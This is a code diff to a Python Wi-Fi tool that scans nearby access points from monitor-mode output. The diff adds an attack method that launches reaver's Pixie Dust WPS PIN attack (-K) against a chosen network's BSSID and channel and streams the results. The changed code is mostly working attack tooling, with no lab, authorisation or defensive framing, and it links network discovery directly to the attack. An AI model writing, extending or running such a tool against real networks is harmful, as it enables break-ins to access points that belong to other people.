@@ -1,5 +1,6 @@
 import os
 import sys
+import typing
 from atexit import register as on_exit
 from contextlib import contextmanager, suppress
 from dataclasses import dataclass
@@ -20,7 +21,6 @@ ifaces = partial(os.listdir, '/sys/class/net/')
 
 @dataclass
 class Scan:
-    # BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
     bssid: str
     pwr: int
     beacons: int
@@ -31,6 +31,20 @@ class Scan:
     encryption: Optional[str]
     cipher: Optional[str]
     essid: str
+
+    def attack(self, interface: str = "wlan0mon", timeout: int = 15):
+        """
+        Attack the target, given an interface and a timeout.
+
+        :param interface:
+        :param timeout:
+        :return:
+        """
+        process = reaver("-i", interface, "-b", self.bssid, "-f",
+                         "-c", str(self.channel), "-vv", "-K", "-t",
+                         str(timeout), "-S")
+        for line in iter(process.stdout.readline, ''):
+            yield line
 
 
 def _force_kill_monitor(monitor_interface: str = "wlan0mon"):
@@ -69,32 +83,28 @@ def dump(interface: str = "wlan0mon") -> Iterator[Scan]:
             scan = [val for val in line.split(b" ") if val not in blacklist]
             with suppress(ValueError):
                 if len(scan) == 11:
-                        yield Scan(
-                            scan[0].decode("utf-8"),
-                            *(int(s) for s in scan[1:7]),
-                            *(s.decode("utf-8") for s in scan[8:])
-                        )
+                    yield Scan(
+                        scan[0].decode("utf-8"),
+                        *(int(s) for s in scan[1:7]),
+                        *(s.decode("utf-8") for s in scan[8:])
+                    )
                 if len(scan) == 9:
-                        yield Scan(
-                            scan[0].decode("utf-8"),
-                            *(int(s) for s in scan[1:7]),
-                            "",
-                            "",
-                            scan[-1].decode("utf-8")
-                        )
+                    yield Scan(
+                        scan[0].decode("utf-8"),
+                        *(int(s) for s in scan[1:7]),
+                        "",
+                        "",
+                        scan[-1].decode("utf-8")
+                    )
 
 
-def dump_networks(n: int = 10, interface: str = "wlan0mon"):
+def dump_networks(n: int = 10, interface: str = "wlan0mon") -> typing.Dict[str, Scan]:
     networks = {}
-    for scan in dump():
+    for scan in dump(interface):
         networks[scan.essid] = scan
         if len(networks) >= n:
             break
     return networks
-
-
-def attack():
-    pass
 
 
 if __name__ == '__main__':
